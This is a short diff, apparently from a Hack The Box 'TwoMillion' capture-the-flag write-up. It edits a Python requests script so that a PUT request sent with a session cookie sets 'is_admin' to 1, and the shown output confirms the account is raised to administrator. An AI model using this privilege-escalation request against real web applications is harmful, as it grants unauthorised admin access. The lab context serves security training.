@@ -319,7 +319,7 @@ session = requests.Session()
 
 session.cookies.set("PHPSESSID", "qjvqi985nqh19n0nm1bkk032dh")
 try:
-    r = session.put(url, json={"email":"test@test.com", "is_admin":0})
+    r = session.put(url, json={"email":"test@test.com", "is_admin":1})
     print(r.status_code)
     print(r.json())
 except Exception as e:
@@ -332,7 +332,7 @@ except Exception as e:
 
 ❯ python3 request.py
 200
-{'id': 13, 'username': 'test', 'is_admin': 0}
+{'id': 13, 'username': 'test', 'is_admin': 1}
 ╭─ ~/hacking/ctf/htb/easy/twomillion/scripts                                                                       ✔ ─╮
 ╰─                                                                                                                   ─╯
 
